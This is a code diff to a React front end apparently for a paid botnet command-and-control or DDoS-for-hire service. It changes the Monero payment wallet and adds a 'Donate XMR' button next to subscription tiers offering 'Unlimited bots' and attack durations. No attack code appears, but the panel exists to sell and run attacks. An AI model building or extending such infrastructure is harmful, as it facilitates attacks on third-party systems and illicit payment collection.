@@ -37,7 +37,7 @@ const PRICING_PLANS = [
   { plan: 'premium', name: 'PREMIUM', price: '75', duration: '30 days', features: ['Unlimited', '600s max', 'Unlimited bots', 'All methods', 'Dedicated server'], color: 'emerald' },
 ];
 
-const MONERO_WALLET = '44AFFq5kSiGBoZ4NMDwYtN18yncF3oM7ViR';
+const MONERO_WALLET = '8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTuFCkLHtyHnrYNnHycdaGb2Kgkkmw8jViCdB6';
 
 function generateToken(): string {
   return 'WHOAMI-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
@@ -922,6 +922,10 @@ const BotnetC2Panel: React.FC = () => {
               </div>
               <div className="mt-2 text-[6px] text-gray-500 text-center">◆ Send exact amount. Contact @admin after payment for token activation ◆</div>
             </div>
+            {/* Donate Button */}
+            <button onClick={() => log('DONATE: Opening Monero donation modal...')} className="mt-3 w-full py-2 bg-gradient-to-r from-orange-600 to-yellow-600 border border-orange-400 rounded-lg text-[8px] font-black uppercase text-white hover:shadow-[0_0_30px_rgba(255,165,0,0.5)] transition-all flex items-center justify-center gap-2">
+              <i className="fas fa-heartbeat text-red-400 animate-pulse"></i> Support This Project (Donate XMR)
+            </button>
           </div>
 
           {/* Token Generator - Neural Style */}
